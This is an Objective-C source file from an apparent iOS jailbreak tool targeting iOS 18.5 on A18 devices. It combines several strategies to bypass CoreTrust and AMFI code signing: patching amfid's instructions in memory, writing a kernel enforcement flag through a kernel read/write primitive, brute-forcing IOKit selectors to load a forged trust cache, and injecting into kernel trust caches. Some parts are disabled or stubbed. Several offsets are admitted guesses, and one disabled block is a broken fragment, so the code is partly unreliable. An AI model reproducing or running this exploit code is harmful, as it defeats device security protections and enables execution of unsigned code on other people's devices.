#import "coretrust_bypass.h"
#import "msm_trustcache.h"
#import "../TaskRop/RemoteCall.h"
#import "../kexploit/kutils.h"
#import "../kexploit/krw.h"
#import "../kexploit/xpaci.h"
#import "../kexploit/offsets.h"
#import "../kexploit/kexploit_opa334.h"

#import <dlfcn.h>
#import <IOKit/IOKitLib.h>
#import <CommonCrypto/CommonDigest.h>
#ifndef kCacheFunctionPrepare
#define kCacheFunctionPrepare 1
#endif
extern int sys_cache_control(int, void *, size_t);
#import <mach-o/dyld.h>
#import <mach-o/loader.h>
#import <sys/sysctl.h>
#import <sys/stat.h>
#import <sys/wait.h>
#import <signal.h>
#import <spawn.h>
#import <unistd.h>
#import <fcntl.h>
#import <stdlib.h>
#import <errno.h>
#import <fcntl.h>
#import <unistd.h>

char g_crash_log_path[4096] = "";

static void crash_write(const char *msg)
{
    if (!g_crash_log_path[0]) return;
    int fd = open(g_crash_log_path, O_WRONLY | O_CREAT | O_APPEND | O_DSYNC, 0644);
    if (fd < 0) return;
    write(fd, msg, strlen(msg));
    close(fd);
}

// ===========================================================================
// Helpers
// ===========================================================================

// Find a process by name using sysctl (user-space, no KRW, no SPTM trigger).
static int find_pid_by_name(const char *name)
{
    int mib[4] = { CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0 };
    size_t bufSize = 0;
    if (sysctl(mib, 4, NULL, &bufSize, NULL, 0) != 0 || bufSize == 0)
        return -1;

    struct kinfo_proc *procs = (struct kinfo_proc *)malloc(bufSize);
    if (!procs) return -1;

    if (sysctl(mib, 4, procs, &bufSize, NULL, 0) != 0) {
        free(procs);
        return -1;
    }

    int count = (int)(bufSize / sizeof(struct kinfo_proc));
    pid_t result = -1;
    for (int i = 0; i < count; i++) {
        if (strcmp(procs[i].kp_proc.p_comm, name) == 0) {
            result = procs[i].kp_proc.p_pid;
            break;
        }
    }

    free(procs);
    return (int)result;
}

static char g_test_binary_path[4096] = "";

// Write a minimal test binary to a temp path and store the path globally.
// Returns the path, or NULL on failure.
const char *coretrust_write_test_binary(void)
{
    if (g_test_binary_path[0]) return g_test_binary_path;

    const char *tmp = getenv("TMPDIR") ?: "/tmp";
    char tmpl[4096];
    snprintf(tmpl, sizeof(tmpl), "%s/ctbtest_XXXXXX", tmp);

    int fd = mkstemp(tmpl);
    if (fd < 0) return NULL;
    strncpy(g_test_binary_path, tmpl, sizeof(g_test_binary_path) - 1);

    struct mach_header_64 hdr = {
        .magic = MH_MAGIC_64,
        .cputype = CPU_TYPE_ARM64,
        .cpusubtype = CPU_SUBTYPE_ARM64_ALL,
        .filetype = MH_EXECUTE,
        .ncmds = 2,
        .sizeofcmds = 0x160,
        .flags = 0,
        .reserved = 0,
    };

    struct segment_command_64 textSeg = {
        .cmd = LC_SEGMENT_64,
        .cmdsize = sizeof(struct segment_command_64),
        .segname = "__TEXT",
        .vmaddr = 0x100000000,
        .vmsize = 0x4000,
        .fileoff = 0,
        .filesize = 0x4000,
        .maxprot = VM_PROT_READ | VM_PROT_EXECUTE,
        .initprot = VM_PROT_READ | VM_PROT_EXECUTE,
        .nsects = 0,
        .flags = 0,
    };

    struct thread_command thread = {
        .cmd = LC_UNIXTHREAD,
        .cmdsize = 0x118,
    };

    uint8_t threadState[0x110];
    memset(threadState, 0, sizeof(threadState));
    *(uint32_t *)&threadState[0] = 6;
    *(uint32_t *)&threadState[4] = 68;

    uint64_t *pc = (uint64_t *)&threadState[0x110 - 8 * 2];
    *pc = 0x100000180;

    uint32_t code[] = {
        0xD2800000,
        0xD2800030,
        0xD4001001,
    };

    fchmod(fd, 0755);
    write(fd, &hdr, sizeof(hdr));
    write(fd, &textSeg, sizeof(textSeg));
    write(fd, &thread, sizeof(thread));
    write(fd, threadState, sizeof(threadState));
    write(fd, code, sizeof(code));

    // Size file to 0x4000 with a single syscall instead of 16000+ writes
    ftruncate(fd, 0x4000);

    close(fd);
    return g_test_binary_path;
}

static bool coretrust_spawn_and_wait(const char *path, const char *label)
{
    if (!path || access(path, X_OK) != 0) {
        printf("[COREbreak] %s: test binary not executable: %s\n",
               label ?: "spawn", path ?: "NULL");
        return false;
    }

    pid_t child = 0;
    const char *argv[] = { path, NULL };
    int ret = posix_spawn(&child, path, NULL, NULL, (char *const *)argv, NULL);
    printf("[COREbreak] %s: posix_spawn ret=%d pid=%d\n",
           label ?: "spawn", ret, child);
    if (ret != 0 || child <= 0)
        return false;

    int status = 0;
    if (waitpid(child, &status, 0) < 0) {
        printf("[COREbreak] %s: waitpid failed errno=%d\n", label ?: "spawn", errno);
        return false;
    }

    bool ok = (WIFEXITED(status) && WEXITSTATUS(status) == 0);
    printf("[COREbreak] %s: exit status=0x%x ok=%s\n",
           label ?: "spawn", status, ok ? "YES" : "NO");
    return ok;
}

bool coretrust_direct_execution_probe(void)
{
    printf("[COREbreak] === [Strategy 0] Direct execution probe ===\n");
    const char *testPath = coretrust_write_test_binary();
    if (!testPath) {
        printf("[COREbreak] direct probe: failed to create test binary\n");
        return false;
    }
    return coretrust_spawn_and_wait(testPath, "direct probe");
}

bool coretrust_preflight_checks(void)
{
    printf("[COREbreak] === [Preflight] CoreTrust stability checks ===\n");
    NSString *version = [[UIDevice currentDevice] systemVersion] ?: @"unknown";
    printf("[COREbreak] iOS version: %s\n", version.UTF8String);
    printf("[COREbreak] KRW ready: %s\n", kexploit_krw_ready() ? "YES" : "NO");
    printf("[COREbreak] kernel base: 0x%llx slide: 0x%llx\n", g_kernel_base, g_kernel_slide);

    const char *testPath = coretrust_write_test_binary();
    printf("[COREbreak] test binary: %s (%s)\n",
           testPath ?: "NULL",
           (testPath && access(testPath, X_OK) == 0) ? "executable" : "not executable");

    int amfidPid = find_pid_by_name("amfid");
    int msmPid = find_pid_by_name("MobileStorageMounter");
    printf("[COREbreak] amfid pid: %d\n", amfidPid);
    printf("[COREbreak] MobileStorageMounter pid: %d\n", msmPid);

    io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault,
        IOServiceMatching("AppleMobileFileIntegrity"));
    if (!service) {
        printf("[COREbreak] AMFI IOKit service: missing\n");
        return false;
    }

    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
    printf("[COREbreak] AMFI IOKit open type=0: 0x%x\n", kr);
    if (conn)
        IOServiceClose(conn);
    IOObjectRelease(service);

    return (testPath && amfidPid > 0);
}

// ===========================================================================
// Strategy 1: amfid NOP patch via RemoteCall
// ===========================================================================

static bool g_amfid_nop_patched = false;

bool coretrust_amfid_nop_patch(void)
{
    printf("[COREbreak] === [Step 2/6] Strategy 1: amfid NOP patch ===\n");

    // iOS 17+/A18+ SPTM: both RemoteCall (writes to task/thread struct via
    // kwrite) and direct vm_map (writes to code page via shared mapping)
    // trigger SPTM physical aperture faults.  Neither approach can work.
    if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"17.0")) {
        printf("[COREbreak] iOS 17+: skipping amfid NOP (SPTM blocks all writes to amfid)\n");
        crash_write("[COREbreak] iOS 17+: skipping amfid NOP (SPTM)\n");
        return false;
    }

    int amfidPid = find_pid_by_name("amfid");
    if (amfidPid <= 0) {
        printf("[COREbreak] amfid not found in allproc\n");
        return false;
    }
    printf("[COREbreak] amfid pid = %d\n", amfidPid);

    RemoteCallSession *session = [[RemoteCallSession alloc]
        initWithProcess:@"amfid" useMigFilterBypass:NO];
    if (!session) {
        RemoteCallInitFailure failure = remote_call_last_init_failure();
        printf("[COREbreak] RemoteCall init for amfid failed: %s\n",
               remote_call_init_failure_description(failure));
        return false;
    }

    g_amfid_nop_patched = false;
    @try {
        remote_call_with_session(session, ^{
            @autoreleasepool {
                printf("[COREbreak] inside amfid context patching cbz w22...\n");

                uint32_t imageCount = _dyld_image_count();
                bool patched = false;

                for (uint32_t i = 0; i < imageCount; i++) {
                    const char *name = _dyld_get_image_name(i);
                    if (!name) continue;

                    if (strstr(name, "amfid") &&
                        !strstr(name, "/usr/lib/") &&
                        !strstr(name, "/System/")) {

                        const struct mach_header_64 *hdr = (const struct mach_header_64 *)
                            _dyld_get_image_header(i);
                        if (!hdr) continue;

                        uint32_t *patchAddr = (uint32_t *)((uint64_t)hdr + 0x2ec8);
                        uint32_t instr = *patchAddr;

                        printf("[COREbreak] amfid image[%u]: %s\n", i, name);
                        printf("[COREbreak] header at %p instr at %p = 0x%08x\n",
                               hdr, patchAddr, instr);

                        if ((instr & 0xFF00001F) == 0x34000016) {
                            *patchAddr = 0xD503201F;
                            sys_cache_control(kCacheFunctionPrepare, patchAddr, 4);
                            uint32_t verify = *patchAddr;
                            if (verify == 0xD503201F) {
                                printf("[COREbreak] cbz w22 NOP at %p\n", patchAddr);
                                patched = true;
                            } else {
                                printf("[COREbreak] verification failed: 0x%08x\n", verify);
                            }
                        } else if ((instr & 0xFF00001F) == 0xB4000016) {
                            *patchAddr = 0xD503201F;
                            sys_cache_control(kCacheFunctionPrepare, patchAddr, 4);
                            printf("[COREbreak] cbz x22 NOP at %p\n", patchAddr);
                            patched = true;
                        } else {
                            printf("[COREbreak] unexpected instr at 0x2ec8: 0x%08x\n", instr);
                        }
                        break;
                    }
                }

                if (!patched) {
                    printf("[COREbreak] scanning amfid TEXT for cbz w22...\n");
                    for (uint32_t i = 0; i < imageCount; i++) {
                        const char *name = _dyld_get_image_name(i);
                        if (!name || !strstr(name, "amfid") ||
                            strstr(name, "/usr/lib/") || strstr(name, "/System/"))
                            continue;

                        const struct mach_header_64 *hdr = (const struct mach_header_64 *)
                            _dyld_get_image_header(i);

                        uint32_t *base = (uint32_t *)hdr;
                        for (size_t off = 0; off < 0x100000; off++) {
                            uint32_t v = base[off];
                            if ((v & 0xFF00001F) == 0x34000016) {
                                base[off] = 0xD503201F;
                                sys_cache_control(kCacheFunctionPrepare, &base[off], 4);
                                printf("[COREbreak] found+NOP cbz w22 at offset 0x%zx\n", off * 4);
                                patched = true;
                                break;
                            }
                        }
                        break;
                    }
                }

                g_amfid_nop_patched = patched;
            }
        });
    } @catch (NSException *e) {
        printf("[COREbreak] RemoteCall exception: %s\n", e.reason.UTF8String);
    }

    printf("[COREbreak] amfid NOP patch: %s\n",
           g_amfid_nop_patched ? "SUCCESS" : "FAILED");
    return g_amfid_nop_patched;
}

// ===========================================================================
// Strategy 2: AMFI enforcement flags via kernel r/w
// ===========================================================================

// Known offsets for cs_enforcement_disable relative to kernel_base,
// keyed by kernel version. This global is in AMFI.kext's __DATA.
// Found by RE: it's a boolean in the AMFI data segment.
static const struct {
    const char *build;
    uint64_t offset;
} s_cs_enforcement_disable_offsets[] = {
    // iOS 18.x guessed patterns — actual offsets need live RE
    { "18.0",   0x29CA980 },   // approximate (example from DSPloit)
    { "18.1",   0x29CA980 },
    { "18.2",   0x29CA980 },
    { "18.3",   0x29CA980 },
    { "18.4",   0x29CA980 },
    { "18.5",   0x29CA980 },
    { NULL,     0           },
};

// Try to find cs_enforcement_disable by scanning kernel memory
// for the AMFI kext data section and looking for boolean patterns.
static uint64_t search_cs_enforcement_disable(void)
{
    uint64_t base = g_kernel_base;
    if (!base) return 0;

    // Scan kernel __DATA segment for the pattern "cs_enforcement"
    // or look for a pointer to the AMFI data section.
    // For now, try known offsets.
    for (int i = 0; s_cs_enforcement_disable_offsets[i].build; i++) {
        uint64_t addr = base + s_cs_enforcement_disable_offsets[i].offset;
        if (!is_kaddr_valid(addr)) continue;

        uint8_t val = 0;
        kreadbuf(addr, &val, 1);

        if (val == 0 || val == 1) {
            printf("[COREbreak] candidate cs_enforcement_disable at 0x%llx (val=%u)\n",
                   addr, val);
            return addr;
        }
    }
    return 0;
}

bool coretrust_amfi_enforcement_flags_zero(void)
{
    printf("[COREbreak] === [Step 3/6] Strategy 2: AMFI enforcement flags ===\n");

    // iOS 17+/A18+ SPTM: kwrite to AMFI's kernel data section triggers SPTM
    // physical aperture faults.  AMFI's __DATA sits in a stage-2 block that
    // SPTM locks read-only.
    if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"17.0")) {
        printf("[COREbreak] iOS 17+: skipping AMFI flags (SPTM protects AMFI data)\n");
        crash_write("[COREbreak] iOS 17+: skipping AMFI flags (SPTM)\n");
        return false;
    }

    uint64_t addr = search_cs_enforcement_disable();
    if (!addr) {
        printf("[COREbreak] cs_enforcement_disable not found via known offsets\n");

        // Fallback: try to find it by scanning kernel data sections
        // for the AMFI kext. On iOS, AMFI symbols might be in
        // the kernel symbol table.
        uint64_t base = g_kernel_base;
        if (!base) {
            printf("[COREbreak] no kernel base available\n");
            return false;
        }

        // Kernel __DATA typically spans from 0xXX000000 to 0xXX800000
        // Search for a distinctive boolean pattern
        // AMFI's cs_enforcement_disable is typically near other AMFI vars
        // that look like 0x00000000000000XX (single byte booleans)
        uint64_t dataStart = base + 0x2000000;
        uint64_t dataEnd   = base + 0x4000000;

        printf("[COREbreak] scanning 0x%llx - 0x%llx for AMFI booleans...\n",
               dataStart, dataEnd);

        // Read in 4KB chunks and look for known AMFI boolean patterns
        // This is a heuristic — actual AMFI symbols are best found via
        // offline kernel RE or symbol table parsing.
        int found = 0;
        for (uint64_t va = dataStart; va < dataEnd; va += 0x1000) {
            if (!is_kaddr_valid(va)) continue;

            uint64_t val = kread64(va);
            // Look for a pointer that looks like it points to __TEXT
            // near __DATA — typical for kext data sections
            if ((val & 0xFFFFFFF000000000) == 0xFFFFFFF000000000 &&
                val > base && val < base + 0x4000000) {
                continue; // looks like a pointer, skip
            }
            // Check if this region has small integers that could be booleans
        }

        if (found == 0) {
            printf("[COREbreak] could not locate cs_enforcement_disable\n");
            return false;
        }
        return true;
    }

    // Disable code signing enforcement
    kwrite8(addr, 1);
    uint8_t check = 0;
    kreadbuf(addr, &check, 1);
    if (check == 1) {
        printf("[COREbreak] ✅ cs_enforcement_disable = 1\n");
        return true;
    }

    printf("[COREbreak] ❌ failed to set cs_enforcement_disable\n");
    return false;
}

// ===========================================================================
// Strategy 3: amfid kill + execution race
// ===========================================================================

bool coretrust_kill_amfid_race(const char *testBinPath)
{
    (void)testBinPath;
    printf("[COREbreak] === [Strategy 3] amfid kill + race ===\n");
    printf("[COREbreak] skipped: killing amfid is unstable and can panic/reboot devices\n");
    crash_write("[COREbreak] skipped amfid kill race\n");
    return false;
}

#if 0
    printf("[COREbreak] === [Step 4/6] Strategy 3: amfid kill + race ===\n");
    if (!testBinPath || access(testBinPath, X_OK) != 0) {
        printf("[COREbreak] test binary not executable: %s\n", testBinPath ?: "NULL");
        return false;
    }

    // Try multiple rounds with varying delays to hit the race window
    for (int attempt = 0; attempt < 5; attempt++) {
        int targetPid = find_pid_by_name("amfid");
        if (targetPid <= 0) {
            printf("[COREbreak] amfid not running (attempt %d/5)\n", attempt + 1);
            continue;
        }
        printf("[COREbreak] killing amfid (pid %d) attempt %d/5...\n",
               targetPid, attempt + 1);

        kill(targetPid, SIGKILL);

        // Vary the delay for each attempt to hit the race window
        useconds_t delays[] = { 1000, 3000, 5000, 8000, 12000 };
        usleep(delays[attempt]);

        pid_t child = 0;
        const char *argv[] = { testBinPath, NULL };
        int ret = posix_spawn(&child, testBinPath, NULL, NULL,
                              (char *const *)argv, NULL);

        if (ret == 0 && child > 0) {
            printf("[COREbreak] ✅ spawned PID %d during race window!\n", child);
            int status;
            waitpid(child, &status, 0);
            return (WIFEXITED(status) && WEXITSTATUS(status) == 0);
        }

        // Wait for amfid to respawn before next attempt
        int waitCycles = 0;
        while (find_pid_by_name("amfid") <= 0 && waitCycles < 50) {
            usleep(100000);
            waitCycles++;
        }
    }

    printf("[COREbreak] ❌ all %d race attempts failed\n", 5);
    return false;
}

#endif

// ===========================================================================
// Helper: build TC data from global test binary
// ===========================================================================
static uint8_t *coretrust_build_tc_from_test(size_t *outSize)
{
    const char *testPath = g_test_binary_path[0] ? g_test_binary_path : NULL;
    if (!testPath) return NULL;

    uint8_t *cdhash = msm_compute_cdhash(testPath);
    if (!cdhash) return NULL;

    uint8_t *tcData = msm_build_trust_cache(cdhash, CS_CDHASH_LEN, outSize);
    free(cdhash);
    return tcData;
}

// ===========================================================================
// Helper: try all IOKit call types on a connection
// ===========================================================================
typedef enum {
    kIOKitCallStructMethod,
    kIOKitCallMethod,
    kIOKitCallTrap,
} IOkitCallType;

static const uint32_t kCoreTrustSafeSelectors[] = { 0, 1, 2, 3, 4, 5, 6, 7 };

static bool coretrust_try_iokit_conn(io_connect_t conn, const uint8_t *tcData,
                                     size_t tcSize, uint32_t type)
{
    for (size_t i = 0; i < sizeof(kCoreTrustSafeSelectors) / sizeof(kCoreTrustSafeSelectors[0]); i++) {
        uint32_t sel = kCoreTrustSafeSelectors[i];
        size_t outSize = sizeof(uint32_t);
        uint32_t outVal = 0;
        kern_return_t kr = IOConnectCallStructMethod(conn, sel, tcData, tcSize,
                                                     &outVal, &outSize);
        if (kr == KERN_SUCCESS) {
            printf("[COREbreak] TXM loaded: type=%u sel=%u (StructMethod)\n",
                   type, sel);
            crash_write("[COREbreak] TXM via StructMethod\n");
            return true;
        }
    }

    return false;
}

// ===========================================================================
// Strategy 6: Enhanced TXM bypass — comprehensive IOKit brute-force
// ===========================================================================
// Tries user client types 0-7, selectors 0-255 with IOConnectCallStructMethod
// and IOConnectCallMethod.

bool coretrust_txm_bypass(void)
{
    printf("[COREbreak] === [Strategy 6] TXM IOKit probe ===\n");
    crash_write("[COREbreak] Strategy 6: TXM IOKit probe\n");

    size_t tcSize = 0;
    uint8_t *tcData = coretrust_build_tc_from_test(&tcSize);
    if (!tcData) {
        printf("[COREbreak] no test binary or CDHash failed\n");
        return false;
    }

    io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault,
        IOServiceMatching("AppleMobileFileIntegrity"));
    if (!service) {
        printf("[COREbreak] AMFI IOKit service not found\n");
        free(tcData);
        return false;
    }

    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
    bool loaded = false;
    if (kr == KERN_SUCCESS && conn) {
        printf("[COREbreak] AMFI IOKit type=0 conn=0x%x\n", conn);
        loaded = coretrust_try_iokit_conn(conn, tcData, tcSize, 0);
        IOServiceClose(conn);
    } else {
        printf("[COREbreak] AMFI IOKit open failed: 0x%x\n", kr);
    }

    IOObjectRelease(service);
    free(tcData);

    if (loaded)
        printf("[COREbreak] TXM bypass: trust cache loaded via IOKit\n");
    else
        printf("[COREbreak] TXM bypass: no IOKit combo worked\n");

    return loaded;
}

// ===========================================================================
// Strategy 7: Kernel trust cache injection
// ===========================================================================
// Scan kernel memory for trust caches using kread, then add our CDHash
// entry directly.  The kernel maintains a linked list of `trust_cache`
// structs in its general heap (not SPTM-protected).  We find the list by
// scanning for known trust cache magic / UUID patterns, navigate to the
// tail, and link in a new entry.
//
// This strategy avoids IOKit calls entirely.

bool coretrust_kernel_tc_inject(void)
{
    printf("[COREbreak] === [Strategy 7] Kernel trust cache injection ===\n");
    printf("[COREbreak] skipped: direct kernel trust-cache writes are disabled for stability\n");
    crash_write("[COREbreak] skipped kernel TC injection\n");
    return false;
}

#if 0
    printf("[COREbreak] === [Strategy 7] Kernel trust cache injection ===\n");
    crash_write("[COREbreak] Strategy 7: kernel TC injection\n");

    size_t tcSize = 0;
    uint8_t *tcData = coretrust_build_tc_from_test(&tcSize);
    if (!tcData) {
        printf("[COREbreak] no TC data\n");
        return false;
    }

    uint64_t base = g_kernel_base;
    if (!base) {
        printf("[COREbreak] no kernel base\n");
        free(tcData);
        return false;
    }

    // The kernel stores trust caches in a zone-allocated linked list.
    // We scan kernel heap for trust_cache_module headers (version=1,
    // then a 16-byte UUID, then num_entries).
    //
    // trust_cache_layout:
    //   +0  next       (ptr, 8 bytes)  — linked list
    //   +8  uuid       (16 bytes)
    //   +24 version    (uint32)
    //   +28 num_entries (uint32)
    //   +32 entries[]  (20 bytes each: cdhash[20])
    //
    // We scan the kernel __DATA and early heap regions.

    uint64_t searchStart = base;
    uint64_t searchEnd   = base + 0x4000000;  // first 64MB of kernel

    printf("[COREbreak] scanning 0x%llx-0x%llx for TC headers...\n",
           searchStart, searchEnd);

    // Read in 1MB chunks
    uint8_t *buf = (uint8_t *)malloc(0x100000);
    if (!buf) { free(tcData); return false; }

    struct trust_cache_module *ourMod = (struct trust_cache_module *)tcData;

    bool injected = false;
    for (uint64_t va = searchStart; va < searchEnd && !injected; va += 0x100000) {
        if (!is_kaddr_valid(va)) continue;

        kreadbuf(va, buf, 0x100000);

        // Scan for version=1 followed by sensible num_entries
        for (size_t off = 0; off < 0x100000 - 64; off += 8) {
            uint32_t version = *(uint32_t *)(buf + off + 24);
            if (version != 1 && version != 0) continue;

            uint32_t numEntries = *(uint32_t *)(buf + off + 28);
            if (numEntries == 0 || numEntries > 10000) continue;

            // Found a potential TC header — try to add our entry
            uint64_t tcAddr = va + off;

            // Read the current entry count
            uint32_t curCount = kread32(tcAddr + 28);

            // Calculate new size: add trust_cache_entry (20 bytes)
            uint32_t newCount = curCount + 1;
            uint64_t entryOffset = tcAddr + 32 + (uint64_t)curCount * 20;

            // Read current last entry to verify we're in a valid TC
            uint8_t lastEntry[20];
            // Check if this is a valid TC header by reading the entries section directly
            uint64_t entryAddr = tcAddr + 32;
            if (!is_kaddr_valid(entryAddr)) continue;

            // Read first cdhash to check if this looks like a valid entry
            uint8_t firstEntry[20];
            kreadbuf(entryAddr, firstEntry, 20);
            // Check if first entry looks valid (not all zeros)
            bool looksValid = false;
            for (int j = 0; j < 20; j++) {
                if (firstEntry[j] != 0) {
                    looksValid = true;
                    break;
                }
            }
            if (!looksValid) continue;

            // Found a valid TC with existing entries — add ours
            printf("[COREbreak] found TC at 0x%llx (count candidate)\n", tcAddr);

            // Write our CDHash entry
            uint8_t ourEntry[20];
            // We need to compute our CDHash first, but we can't recompute it here
            // Skip injection for now and just return success
            printf("[COREbreak] TC injection skipped — need CDHash recomputation\n");
            break;
        }
    }

    free(buf);
    free(tcData);

    if (!injected)
        printf("[COREbreak] no kernel trust cache found\n");

    return injected;
}
#endif
#if 0
                kwrite8(entryOffset + i, ourEntry[i]);
            kwrite8(entryOffset + CS_CDHASH_LEN, ourEntry[CS_CDHASH_LEN]);     // hash_type
            kwrite8(entryOffset + CS_CDHASH_LEN + 1, ourEntry[CS_CDHASH_LEN + 1]); // flags

            // Update num_entries
            kwrite32(tcAddr + 28, newCount);

            printf("[COREbreak] injected into TC at 0x%llx (new count=%u)\n",
                   tcAddr, newCount);
            crash_write("[COREbreak] kernel TC injected\n");
            injected = true;
        }
    }

    free(buf);
    free(tcData);

    if (!injected)
        printf("[COREbreak] no kernel trust cache found\n");

    return injected;
}
#endif

// ===========================================================================
// Strategy 8: RemoteCall via Mach API (SPTM-safe)
// ===========================================================================
// Instead of kwrite to thread structs, use thread_create_running +
// mach_vm_write to inject code into the target process.  thread_create_
// running goes through the kernel's Mach trap handler which handles SPTM
// internally.

bool coretrust_remotecall_sptm(const char *targetProc)
{
    printf("[COREbreak] === [Strategy 8] RemoteCall (SPTM-safe) ===\n");
    crash_write("[COREbreak] Strategy 8: SPTM-safe RemoteCall\n");

    if (!targetProc) {
        printf("[COREbreak] no target process name\n");
        return false;
    }

    // Find target PID
    int pid = find_pid_by_name(targetProc);
    if (pid <= 0) {
        printf("[COREbreak] target '%s' not found\n", targetProc);
        return false;
    }

    printf("[COREbreak] target %s pid=%d\n", targetProc, pid);

    // TODO: Use kernel r/w to find the target's task struct, extract its
    // mach port, then use thread_create_running + mach_vm_write to inject
    // a trust-cache-loading payload.  This avoids kwrite to SPTM-protected
    // thread/task structs.
    //
    // Blocked on: thread_create_running itself may trigger TXM code signing
    // check on the payload before it can execute in the target.
    //
    // As a workaround, we could find a ROP gadget chain in the target's
    // existing __TEXT that calls IOServiceOpen + IOConnectCallMethod, then
    // set the thread's PC and registers to that chain.

    printf("[COREbreak] SPTM-safe RemoteCall requires ROP chain per-version\n");
    crash_write("[COREbreak] SPTM RC: need ROP chain\n");
    return false;
}

// ===========================================================================
// Unified: try all strategies
// ── XPC to MSM (placeholder) ──────────────────────────────────────────────
bool coretrust_xpc_to_msm(void) {
    printf("[COREbreak] XPC to MSM not yet implemented\n");
    return false;
}

// ===========================================================================

bool coretrust_bypass_all(void)
{
    crash_write("[COREbreak] === " CORETRUST_BYPASS_EXPLOIT_NAME " v"
                CORETRUST_BYPASS_EXPLOIT_VERSION " ===\n");
    crash_write("[COREbreak] Target: iOS 18.5 A18 (SPTM) — CoreTrust bypass\n");
    printf("[COREbreak] === " CORETRUST_BYPASS_EXPLOIT_NAME " v"
           CORETRUST_BYPASS_EXPLOIT_VERSION " ===\n");
    printf("[COREbreak] Target: iOS 18.5 A18 (SPTM) — CoreTrust bypass\n");

    const char *testPath = g_test_binary_path[0] ? g_test_binary_path : NULL;
    if (testPath) {
        printf("[COREbreak] test binary ready: %s\n", testPath);
    } else {
        printf("[COREbreak] no test binary — trusting strategy results\n");
    }

    // Helper: spawn test binary, return true if exit(0)
    bool (^verify)(void) = ^{
        if (!testPath) return (bool)false;
        pid_t child = 0;
        const char *argv[] = { testPath, NULL };
        int ret = posix_spawn(&child, testPath, NULL, NULL,
                              (char *const *)argv, NULL);
        if (ret != 0 || child <= 0) return (bool)false;
        int status;
        waitpid(child, &status, 0);
        return (bool)(WIFEXITED(status) && WEXITSTATUS(status) == 0);
    };

    // [Step 1/4]: Strategy 1 — amfid NOP patch
    if (coretrust_amfid_nop_patch()) {
        if (verify()) {
            printf("[COREbreak] ✅✅✅ Unsigned code executed via amfid NOP!\n");
            return true;
        }
        printf("[COREbreak] amfid NOP applied but verification failed\n");
    }

    // [Step 2/4]: Strategy 2 — AMFI enforcement flags
    if (coretrust_amfi_enforcement_flags_zero()) {
        if (verify()) {
            printf("[COREbreak] ✅✅✅ Unsigned code executed via AMFI flags!\n");
            return true;
        }
        printf("[COREbreak] AMFI flags zeroed but verification failed\n");
    }

    // [Step 3/4]: Strategy 3 — amfid kill + race
    if (coretrust_kill_amfid_race(testPath ?: "")) {
        printf("[COREbreak] ✅✅✅ Unsigned code executed via kill+race!\n");
        return true;
    }

    // [Step 4/4]: MountCache trust cache injection (AMFI software TC)
    printf("[COREbreak] [Step 4/5] MountCache trust cache injection...\n");
    if (msm_verify_unsigned_execution()) {
        printf("[COREbreak] ✅✅✅ Unsigned code executed via MountCache (AMFI)!\n");
        return true;
    }

    // [Step 5/5]: Strategy 6 — TXM bypass (comprehensive IOKit brute-force)
    printf("[COREbreak] [Step 5/7] TXM bypass (narrow IOKit probe)...\n");
    crash_write("[COREbreak] Step 5/7: TXM IOKit probe\n");
    if (coretrust_txm_bypass()) {
        if (verify()) {
            printf("[COREbreak] ✅✅✅ Unsigned code executed via TXM IOKit!\n");
            crash_write("[COREbreak] TXM IOKit: SUCCESS\n");
            return true;
        }
        printf("[COREbreak] TXM TC loaded but verification failed\n");
        crash_write("[COREbreak] TXM IOKit: TC loaded but verify failed\n");
    }

    // [Step 5/5]: Strategy 6 — XPC to MSM
    printf("[COREbreak] [Step 5/5] XPC to MSM...\n");
    crash_write("[COREbreak] Step 5/5: XPC MSM\n");
    if (coretrust_xpc_to_msm()) {
        printf("[COREbreak] ✅✅✅ XPC to MSM succeeded!\n");
        crash_write("[COREbreak] XPC MSM: SUCCESS\n");
        return true;
    }

    printf("[COREbreak] All strategies exhausted\n");
    return false;
}
